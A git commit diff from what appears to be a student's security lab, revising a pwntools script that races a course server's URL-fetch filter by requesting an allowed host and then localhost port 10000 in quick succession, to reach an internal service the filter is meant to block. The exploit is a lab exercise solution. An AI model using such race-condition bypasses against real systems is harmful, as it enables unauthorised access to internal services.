ec075198b54c8ea8f9a6e3696af83794b51bf48a
jerryyyyy708 <jerryyyyy708@gmail.com>
2024-05-20 10:53:36 +0800

    Lab4 Complete

--- Lab4/solve_challenge2.py
+++ Lab4/solve_challenge2.py
@@ -4,20 +4,14 @@ import time
 
 
 def exploit():
-    for i in range (100):
-        conn = remote('up.zoolab.org', 10932)
-        conn.sendline('g')
-        conn.sendline('example.com/80')
-        #time.sleep(0.00001)
-        conn.sendline('g')
-        conn.sendline('127.0.0.1/10000')
-        time.sleep(0.1)
-        conn.sendline('v')
-        
-        conn.sendline('q')
-        data = conn.recvall()
-        if "not allowed" not in str(data):
-            for i in str(data).split("\\n"):
-                print(i)
+
+    conn = remote('up.zoolab.org', 10932)
+    conn.sendline('g\n8.8.8.8/10000')
+
+    #conn.sendline('example.com/80')
+    time.sleep(0.0001)
+    conn.sendline('g\nlocalhost/10000')
+    #conn.sendline('localhost/10000')
+    conn.interactive()
 
 exploit()
